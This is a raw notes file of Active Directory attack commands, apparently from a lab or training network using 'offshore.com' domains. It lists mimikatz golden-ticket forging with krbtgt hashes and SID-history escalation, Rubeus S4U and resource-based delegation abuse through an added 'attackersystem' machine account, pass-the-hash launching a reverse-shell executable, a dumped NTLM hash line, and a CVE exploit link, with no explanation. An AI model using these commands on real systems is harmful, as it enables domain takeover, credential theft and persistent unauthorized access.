e5079e8e9d934d1d0df292e2f510229f dev$
S-1-5-21-1416445593-394318334-2645530166

S-1-5-21-1416445593-394318334-2645530166-1108 

.\m.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-2291914956-3290296217-2402366952 /rc4:cba2ed22077aa56ae957bcf43a8d82f8 /service:krbtgt /target:dev.ADMIN.OFFSHORE.COM /sids:S-1-5-21-1416445593-394318334-2645530166-1108 /ticket:C:\dev.kirbi" "exit"

.\r.exe asktgs /ticket:C:\dev.kirbi /service:CIFS/DC02.DEV.ADMIN.OFFSHORE.COM /dc:DC02.DEV.ADMIN.OFFSHORE.COM /ptt

Get-ADGroup -Filter 'SID -ge "S-1-5-21-1416445593-394318334-2645530166-1000"' -Server dev.ADMIN.OFFSHORE.COM

https://github.com/blackarrowsec/advisories/blob/master/2019/CVE-2019-14666/CVE-2019-14666.py

mgmt01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:971bc1ac6d2344c4b42107976e0972dc:::

New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

mimikatz.exe "sekurlsa::pth /user:administrator /ntlm:a569f80ccd9fda0ea5e749d20aa80657 /domain:client.offshore.com /run:c:\rev.exe" "exit"

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:ldap/DC02.dev.ADMIN.OFFSHORE.COM /ptt

kerberos::golden /user:administrator /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /krbtgt:9404def404bc198fd9830a3483869e78 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /ptt

kerberos::golden /user:administrator /domain:ADMIN.OFFSHORE.COM /sid:S-1-5-21-1216317506-3509444512-4230741538 /krbtgt:ea9112d4beb759907688c9e267eff246 /sids:S-1-5-21-524867371-2016665888-3240400722-4110 /ptt

dir \\dc04.client.offshore.com\c$

R.exe s4u /user:ms02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:cifs/DC04.CLIENT.OFFSHORE.COM /altservice:ldap /ptt